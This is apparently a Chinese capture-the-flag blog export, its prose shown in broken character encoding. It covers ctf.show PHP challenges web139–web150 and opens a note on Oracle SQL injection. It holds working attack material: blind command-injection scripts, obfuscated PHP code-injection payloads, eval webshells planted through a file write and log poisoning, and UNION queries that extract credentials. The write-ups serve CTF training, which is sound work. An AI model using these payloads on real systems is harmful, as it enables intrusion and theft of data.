<h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><p>åœ¨136çš„åŸºç¡€ä¸Šé™åˆ¶äº†å†™æ–‡ä»¶çš„æƒé™ï¼Œè¿™æ—¶å€™å¯ä»¥è€ƒè™‘ç”¨ç›²æ‰“çš„æ–¹å¼ã€‚</p>
<p>çŒœæµ‹æ–‡ä»¶å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">  key=<span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">      payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line">      <span class="comment">#print(payload)</span></span><br><span class="line">      url=<span class="string">&quot;http://fd0a116f-e55b-449d-9acf-59f876b4e975.challenge.ctf.show/?c=&quot;</span>+payload</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">          result=result+n</span><br><span class="line">          <span class="built_in">print</span>(result)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        key=<span class="number">1</span></span><br><span class="line">  result+=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å¾—åˆ°flagæ‰€åœ¨æ–‡ä»¶ f149_15_h3r3ï¼Œæ¥ç€ç›²æ³¨æ–‡ä»¶å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">  <span class="built_in">print</span>(j)</span><br><span class="line">  <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        result=result+n</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å› ä¸ºè¿‡æ»¤äº†{}æ‰€ä»¥ä¼šæˆ‘ä»¬å°±ä¸åŠ {}å‡ºæ¥ï¼Œè·‘å‡ºæ¥flagç„¶åæ‰‹åŠ¨æ·»åŠ å°±å¯ä»¥äº†ã€‚<br>å¦‚æœå®¹æ˜“å‡ºé”™çš„è¯ï¼Œå¯ä»¥åœ¨payload&#x3D;xxxå‰é¢åŠ ä¸ªtime.sleep(0.1)</p>
<h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><p>å¯ä»¥çœ‹åˆ°åªè¦æˆ‘ä»¬è®©intval($code)ä¸º0å°±å¯ä»¥äº†intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code>æ‰€ä»¥æ–¹æ³•å°±æŒºå¤šäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     å› ä¸º/var/www/html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1</span><br><span class="line">getdata</span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1=getcwd&amp;f2=getcwd</span><br></pre></td></tr></table></figure>


<h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å…ˆæ¥çœ‹ä¸‹æ­£åˆ™è¡¨è¾¾å¼<code>/^\W+$/</code> ä½œç”¨æ˜¯åŒ¹é…éæ•°å­—å­—æ¯ä¸‹åˆ’çº¿çš„å­—ç¬¦æ„é€ å‘½ä»¤è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œæœ€ä¸»è¦çš„ä»»åŠ¡æ˜¯returnæ€ä¹ˆç»•è¿‡ã€‚å¤§å®¶å¯ä»¥çœ‹ä¸‹ä¸‹é¢çš„ç¤ºä¾‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1;phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>ä¼šå‘ç°æ˜¯æ— æ³•æ‰§è¡Œphpinfo()çš„ï¼Œä½†æ˜¯phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚</p>
<p>è¿™æ ·å°±å¥½è¯´äº†ã€‚æ„é€ å‡º1-phpinfo()-1å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-phpinfo()-ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯å–æ„é€ å‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å°±ç”¨ä¸ªç®€å•çš„æ–¹å¼å–åæ¥è¯•ä¸€ä¸‹ã€‚</p>
<p>è¿è¡Œè„šæœ¬æ„é€ system(â€˜tac f*â€™)å¾—åˆ° (<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)<br>æ‰€ä»¥æœ€ç»ˆpayload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)-&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><p>è¿‡æ»¤äº†åŠ å‡æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ä¹˜é™¤ï¼Œè¿‡æ»¤äº†~æˆ‘ä»¬å¯ä»¥ç”¨å¼‚æˆ–æ„é€ å‘½ä»¤å…·ä½“å‘½ä»¤æ„é€ payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=*(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0b%01%03%00%06%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%60%2a&quot;</span>)*&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h1><p>ç›¸å¯¹ä¸Šé¢çš„å‡ é“ç±»ä¼¼çš„å¼±åŒ–äº†äº›<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><p>è€ƒå¯Ÿç‚¹ï¼šä¸‰ç›®è¿ç®—ç¬¦çš„å¦™ç”¨<br>å°æµ‹è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿™æ ·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()çš„<br>æ‰€ä»¥åªéœ€è¦åœ¨å‰é¢çš„payloadä¸Šç¨åŠ æ”¹åŠ¨å°±å¯ä»¥äº†<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><p>åˆå¢åŠ äº†åˆ†å·çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æ³•ç”¨ä¸‰ç›®è¿ç®—ç¬¦äº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ç­‰å·å’Œä½è¿ç®—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3===(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)||&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è€ƒå¯Ÿç‚¹ï¼šcreate_function()ä»£ç æ³¨å…¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ç±»ä¼¼äº</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo();&#x2F;&#x2F;<br>å°±ç­‰ä»·äº</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">ä»è€Œæ‰§è¡Œ<span class="title function_ invoke__">phpinfo</span>()å‘½ä»¤</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>fuzzåå‘ç°%5cå¯ä»¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå…·ä½“åŸç†å¯ä»¥çœ‹ä¸‹<a href="https://paper.seebug.org/755/">è¿™ç¯‡æ–‡ç« </a>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: show=<span class="keyword">echo</span> <span class="number">123</span>;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//</span></span><br><span class="line">post: ctf=%<span class="number">5</span>ccreate_function</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>æ²¡æœ‰è¿‡æ»¤^ï¼Œæ‰€ä»¥ç›´æ¥å¼‚æˆ–æ„é€ å°±å¯ä»¥äº†ã€‚<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=(<span class="string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="string">&quot;%09%01%03%01%06%02&quot;</span>^<span class="string">&quot;%7d%60%60%21%60%28&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>åæ¥é—®äº†ä¸‹å‡ºé¢˜äººå‘ç°è¿™ä¸æ˜¯é¢„æœŸè§£ï¼Œé¢„æœŸè§£æ˜¯åˆ©ç”¨ä¸­æ–‡å˜é‡<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=$å“ˆ=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f*</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å…¶å®ä¹Ÿæ˜¯åˆ©ç”¨å¼‚æˆ–æ„é€ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>éé¢„æœŸï¼Œç›´æ¥å¾€index.phpé‡Œé¢å†™ä¸€å¥è¯<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=index.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>é¢„æœŸè§£ æ¡ä»¶ç«äº‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=<span class="number">1</span>.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /c*&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä½¿ç”¨bpä¸æ–­è®¿é—®å¹¶ä¼ å‚ï¼Œç„¶åå¼€ä¸€ä¸ªå»ä¸æ–­è®¿é—® 1.php</p>
<h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><p>éé¢„æœŸ<br>æ—¥å¿—æ–‡ä»¶åŒ…å«å†™ä¸€å¥è¯<br>ä¿®æ”¹user_agentå†…å®¹ä¸ºä¸€å¥è¯ï¼Œç„¶ååŒ…å«&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logå°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬å†™çš„ä¸€å¥è¯äº†ã€‚<br>é¦–å…ˆè®¿é—®index.php ä¿®æ”¹<code>user_agentä¸º&lt;?php eval($_POST[1]);?&gt;</code></p>
<p>ç„¶ååŒ…å«æ—¥å¿—æ–‡ä»¶åå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_2.png"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>PHPç‰¹æ€§</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracleæ³¨å…¥</title>
    <url>/-SQLInject/Oracle/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ‰“JAVAç«™ä¸€èˆ¬æ•°æ®åº“éƒ½æ˜¯Oracleï¼Œæœ‰ä¸€äº›ç‰¹ç‚¹çš„åŸå› ï¼Œæ‰€ä»¥ç‰¹åˆ«è®°å½•ä¸€ä¸‹</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownWynZ1puLEAxdOHl.png"></p>
<span id="more"></span>

<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;def&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;users_abcdef&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>username_gugofj,<span class="operator">+</span>password_wvqepc<span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users_lsnuvu<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<ul>
<li>æ•°æ®åº“</li>
<li>è¡¨<br>  USERS_TPHDTZ</li>
<li>åˆ—<br>  PASSWORD_AGKTIJ<br>  USERNAME_UTZPGF</li>
<li>å­—æ®µ</li>
</ul>
<h1 id="Oracleæ•°æ®åº“"><a href="#Oracleæ•°æ®åº“" class="headerlink" title="Oracleæ•°æ®åº“"></a>Oracleæ•°æ®åº“</h1><h2 id="1ã€ä»‹ç»"><a href="#1ã€ä»‹ç»" class="headerlink" title="1ã€ä»‹ç»"></a>1ã€ä»‹ç»</h2><p>Mysqlæ˜¯ä¸­å°å‹æ•°æ®åº“ï¼Œè€ŒOracleæ˜¯<strong>å¤§å‹æ•°æ®åº“</strong>ã€‚</p>
<p>åœ¨æ³¨å…¥æ—¶Oracleæ•°æ®åº“ä¸MySQLæ•°æ®åº“æ˜¯æœ‰åŒºåˆ«çš„ã€‚</p>
<h2 id="2ã€oracleæ•°æ®åº“æƒé™åˆ†ä¸º2ç±»"><a href="#2ã€oracleæ•°æ®åº“æƒé™åˆ†ä¸º2ç±»" class="headerlink" title="2ã€oracleæ•°æ®åº“æƒé™åˆ†ä¸º2ç±»"></a>2ã€oracleæ•°æ®åº“æƒé™åˆ†ä¸º2ç±»</h2><p>æ³¨é‡Šç¬¦ï¼š<code>--</code></p>
<p><strong>dba</strong>æ‹¥æœ‰å…¨éƒ¨æƒé™ï¼Œæ•°æ®åº“<code>æœ€é«˜æƒé™</code>ï¼Œåªæœ‰dbaæ‰å¯ä»¥åˆ›å»ºæ•°æ®åº“ç»“æ„</p>
<p><strong>oracleæ•°æ®åº“è‡ªå¸¦çš„dualè¡¨ï¼Œåªæœ‰ä¸€è¡Œä¸€åˆ—ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨</strong></p>
<p>dualè¡¨å¯èƒ½è¢«åˆ æ‰ï¼Œsyså¯ä»¥æ¢å¤</p>
<h3 id="2-1-ã€dualè¡¨"><a href="#2-1-ã€dualè¡¨" class="headerlink" title="2.1 ã€dualè¡¨"></a>2.1 ã€dualè¡¨</h3><p>dualæ˜¯ä¸€ä¸ª<code>è™šæ‹Ÿè¡¨</code>ï¼Œç”¨æ¥æ„æˆselectçš„è¯­æ³•è§„åˆ™ï¼Œ<strong>oracleä¿è¯dualé‡Œé¢æ°¸è¿œåªæœ‰ä¸€æ¡è®°å½•</strong>ã€‚æˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥åšå¾ˆå¤šäº‹æƒ…ã€‚</p>
<h2 id="3ã€åˆ¤æ–­æ˜¯å¦ä¸ºoracleæ•°æ®åº“"><a href="#3ã€åˆ¤æ–­æ˜¯å¦ä¸ºoracleæ•°æ®åº“" class="headerlink" title="3ã€åˆ¤æ–­æ˜¯å¦ä¸ºoracleæ•°æ®åº“"></a>3ã€åˆ¤æ–­æ˜¯å¦ä¸ºoracleæ•°æ®åº“</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual)</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




